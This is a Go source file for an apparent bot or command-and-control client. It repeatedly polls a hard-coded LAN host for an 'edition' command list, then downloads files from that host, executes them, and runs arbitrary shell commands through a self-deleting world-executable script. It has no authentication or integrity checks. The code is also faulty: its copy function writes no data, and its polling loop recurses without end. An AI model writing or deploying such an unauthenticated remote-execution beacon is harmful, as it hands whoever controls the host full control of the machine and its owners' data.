package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var downDir string = "./"
var host string = "http://192.168.12.6/"
var edition int = 0

func main() {
	do()
}

func do() {
	stat := getHTTP(host + "stat")
	commands := strings.Split(stat, "\n")
	if strings.Index(commands[0], "EDITION") == -1 {
		fmt.Println("Edition doesn't exist")
		repeat()
		return
	}
	newEdition, _ := strconv.Atoi(strings.Replace(commands[0], "EDITION ", "", 1))
	if newEdition <= edition {
		fmt.Println("No new edition")
		repeat()
		return
	}
	edition = newEdition
	for i := 0; i < len(commands); i++ {
		command := commands[i]
		switch command {
		case "DOWNLOAD":
			downloadFile(downDir+commands[i+1], host+commands[i+1])
		case "EXECUTE":
			execute(commands[i+1])
		case "RUN":
			runCommand(commands[i+1])
		case "MOVE":
			moveFile(commands[i+1], commands[i+2])
		case "COPY":
			copyFile(commands[i+1], commands[i+2])
		}

	}
	repeat()
}

func copyFile(src, dest string) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return
	}
	if !sourceFileStat.Mode().IsRegular() {
		return
	}
	source, err := os.Open(src)
	defer source.Close()

	destination, err := os.Create(dest)
	if err != nil {
		return
	}
	defer destination.Close()
}

func moveFile(src, dest string) {
	os.Rename(src, dest)
}

func runCommand(command string) {
	command = "#!/bin/bash\n" + command + "\nrm -f " + downDir + "executeme.sh"
	ioutil.WriteFile(downDir+"executeme.sh", []byte(command), 0777)
	cmd := exec.Command(downDir + "executeme.sh")
	cmd.Run()
}

func execute(command string) {
	cmd := exec.Command(command)
	cmd.Run()
}

func repeat() {
	delay := ( /*random(19) + */ 1) * 60
	fmt.Printf("Sleeping for %d Minutes\n", delay/60)
	time.Sleep(time.Duration(delay) * time.Second)
	fmt.Printf("Grabbing HTTP\n")
	do()
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func downloadFile(filepath string, url string) error {
	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func getHTTP(url string) string {
	resp, err := http.Get(url)

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}
